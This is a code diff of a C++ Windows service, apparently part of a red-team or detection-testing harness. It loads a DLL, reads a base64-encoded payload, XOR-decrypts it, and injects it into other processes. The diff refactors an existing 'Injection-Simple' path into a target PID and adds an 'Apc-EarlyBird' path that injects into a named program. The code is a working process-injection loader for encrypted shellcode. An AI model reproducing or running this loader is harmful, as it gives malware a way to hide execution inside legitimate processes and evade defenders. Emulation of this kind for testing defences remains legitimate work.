@@ -17,6 +17,9 @@ SERVICE_STATUS_HANDLE hStatus;
 
 typedef void (*StepCallback)(const char* stepName, int stepIndex);
 typedef int (*InjectPayloadSimple)(DWORD, unsigned char*, unsigned int, StepCallback);
+typedef int (*InjectPayloadApcEarlyBird)(const char*, unsigned char*, unsigned int, StepCallback);
+
+void ExecuteFunction(const char* behaviorName);
 
 wchar_t serviceName[] = L"";
 
@@ -84,41 +87,25 @@ void ServiceMain(int argc, char** argv)
 
     std::vector<uint8_t> key = readBinaryFile(keyPath);
 
-    AppendLog("Key file read");
+	HMODULE dll = LoadLibraryA(dllPath.c_str());
+
+    if (!dll)
+    {
+        AppendLog("Failed to load DLL: " + dllPath);
+        return;
+    }
     
+    std::ifstream payloadFile(payloadPath);
+    std::string encoded((std::istreambuf_iterator<char>(payloadFile)),
+        std::istreambuf_iterator<char>());
+
+    auto payload = base64::decode_into<std::vector<uint8_t>>(encoded);
+	auto decrypted = xorDecrypt(payload, key);
+
     if (behaviorName == "Injection-Simple") {
-        HMODULE hDll = LoadLibraryA(dllPath.c_str());
-        if (!hDll)
-        {
-            AppendLog("Failed to load DLL: " + dllPath);
-            return;
-        }
-
-        AppendLog("Dll loaded");
-
-		int targetPID = j["TargetPID"].get<int>();
-        std::ifstream payloadFile(payloadPath);
-        std::string encoded((std::istreambuf_iterator<char>(payloadFile)),
-            std::istreambuf_iterator<char>());
-
-        AppendLog("Payload loaded");
-
-        auto payload = base64::decode_into<std::vector<uint8_t>>(encoded);
-
-        AppendLog("Payload decoded");
-
-        auto decrypted = xorDecrypt(payload, key);
-        int length = decrypted.size();
-
-        AppendLog("Payload decrypted");
-
+        int targetPID = j["TargetPID"].get<int>();
         InjectPayloadSimple inject =
-            (InjectPayloadSimple)GetProcAddress(hDll, "InjectPayloadSimple");
-
-        AppendLog("Get ProcAddress");
-
-        AppendLog("Target PID: " + std::to_string(targetPID));
-
+            (InjectPayloadSimple)GetProcAddress(dll, "InjectPayloadSimple");
         int result = inject(
             targetPID,
             decrypted.data(),
@@ -126,11 +113,31 @@ void ServiceMain(int argc, char** argv)
             nullptr
         );
 
-        AppendLog("Injection result: " + std::to_string(result));
-
-        FreeLibrary(hDll);
+        FreeLibrary(dll);
 
     }
+
+	else if (behaviorName == "Apc-EarlyBird") {
+        AppendLog("Entering APC block");
+        std::string programName = j["ProgramName"];
+        AppendLog("Program name: " + programName);
+        InjectPayloadApcEarlyBird inject =
+            (InjectPayloadApcEarlyBird)GetProcAddress(dll, "InjectPayloadApcEarlyBird");
+        int result = inject(
+            programName.c_str(),
+            decrypted.data(),
+            static_cast<unsigned int>(decrypted.size()),
+            nullptr
+        );
+        AppendLog("Apc Early bird run successfully");
+
+        FreeLibrary(dll);
+    }
+    else {
+		AppendLog("Unknown behavior: " + behaviorName);
+        FreeLibrary(dll);
+    }
+    
     serviceStatus.dwCurrentState = SERVICE_RUNNING;
     SetServiceStatus(hStatus, &serviceStatus);
 
